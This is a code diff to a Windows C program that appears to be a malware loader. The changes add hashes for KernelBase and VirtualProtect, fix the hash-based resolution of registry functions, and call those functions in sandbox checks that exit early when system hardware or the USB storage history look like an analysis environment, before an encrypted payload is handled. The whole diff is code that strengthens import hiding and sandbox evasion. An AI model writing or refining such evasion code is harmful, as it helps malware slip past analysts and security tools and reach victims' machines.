@@ -16,7 +16,9 @@
 #define KERNEL32DLL_HASH 0x367DC15A
 #define USER32DLL_HASH 0x81E3778E
 #define ADVAPI32DLL_HASH 0x00367fD5
+#define KERNELBASEDLL_HASH 0x4F3A1E64
 #define VirtualAlloc_HASH 0xF625556A
+#define VirtualProtect_HASH 0xB40194F8
 #define GetSystemInfo_HASH 0x4BC8FCDF
 #define GlobalMemoryStatusEx_HASH 0x7CF2036B
 #define RegOpenKeyExA_HASH 0x2293925B
@@ -260,14 +262,15 @@ int main() {
 	LoadLibraryA("Advapi32.dll");
 
 	HMODULE advapi32_module = get_module_handle_hash(ADVAPI32DLL_HASH);
+	HMODULE kernelbase_module = get_module_handle_hash(KERNELBASEDLL_HASH);
 
 	// This section checks the hardware of the system for anything that might 
 	// suggest a sandbox
 	{
 		fnGetSystemInfo myGetSystemInfo = get_proc_address_hash(kernel32_module, GetSystemInfo_HASH);
 		fnGlobalMemoryStatusEx myGlobalMemoryStatusEx = get_proc_address_hash(kernel32_module, GlobalMemoryStatusEx_HASH);
-		fnRegOpenKeyExA myRegOpenKeyExA = get_proc_address_hash(advapi32_module, GlobalMemoryStatusEx_HASH);
-		fnRegQueryInfoKeyA myRegQueryInfoKeyA = get_proc_address_hash(advapi32_module, GlobalMemoryStatusEx_HASH);
+		fnRegOpenKeyExA myRegOpenKeyExA = get_proc_address_hash(advapi32_module, RegOpenKeyExA_HASH);
+		fnRegQueryInfoKeyA myRegQueryInfoKeyA = get_proc_address_hash(kernelbase_module, RegQueryInfoKeyA_HASH);
 		// fnGetMonitorInfoW myGetMonitorInfoW = get_proc_address_hash(user32_module, GetMonitorInfoW_HASH);
 		// fnEnumDisplayMonitors myEnumDisplayMonitors = get_proc_address_hash(user32_module, EnumDisplayMonitors_HASH);
 
@@ -290,11 +293,11 @@ int main() {
 		DWORD err = NULL;
 		HKEY hkey = NULL;
 		DWORD usb_num = NULL;
-		if ((err = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", NULL, KEY_READ, &hkey)) != ERROR_SUCCESS) {
+		if ((err = myRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", NULL, KEY_READ, &hkey)) != ERROR_SUCCESS) {
 			return -1;
 		}
 
-		if ((err = RegQueryInfoKeyA(hkey, NULL, NULL, NULL, &usb_num, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
+		if ((err = myRegQueryInfoKeyA(hkey, NULL, NULL, NULL, &usb_num, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
 			return -1;
 		}
 
@@ -311,6 +314,7 @@ int main() {
 			return;
 		}
 	}
+
 
 	SIZE_T len = sizeof(encrypted_payload);
 
